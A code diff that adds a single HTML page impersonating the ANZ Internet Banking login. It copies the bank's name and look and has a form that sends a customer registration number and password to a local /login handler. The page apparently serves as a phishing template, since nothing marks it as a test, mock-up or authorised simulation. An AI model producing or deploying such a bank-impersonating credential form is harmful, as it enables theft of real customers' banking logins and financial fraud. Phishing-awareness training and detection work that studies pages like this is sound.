@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>ANZ Internet Banking</title>
+    </head>
+    <body>
+        <style>
+            .login-box { 
+                width: 400px; 
+                margin: auto; 
+                padding: 20px; 
+                background: white; 
+            }
+            body { 
+                font-family: Arial; 
+                background-color: #f4f4f4; 
+                height: 100vh; 
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+            }
+            input { 
+                width: 100%; 
+                padding: 10px; 
+                margin: 10px 0; 
+                box-sizing: border-box; 
+            }
+            button { 
+                width: 100%; 
+                padding: 10px; 
+                margin: 10px 0; 
+                background: #0072AC; 
+                color: white; 
+                border: none; 
+            }
+        </style>
+        <div class="login-box">
+            <h2>Log in to ANZ Internet Banking</h2>
+            <form action="/login" method="post">
+                <small style="color: gray;">Customer Registration  Number</small>
+                <input type="text" name="username" required>
+                <small style="color: gray;">Password</small>
+                <input type="password" name="password" required>
+                <button type="submit">Log in</button>
+            </form>
+        </div>
+    </body>
+</html>
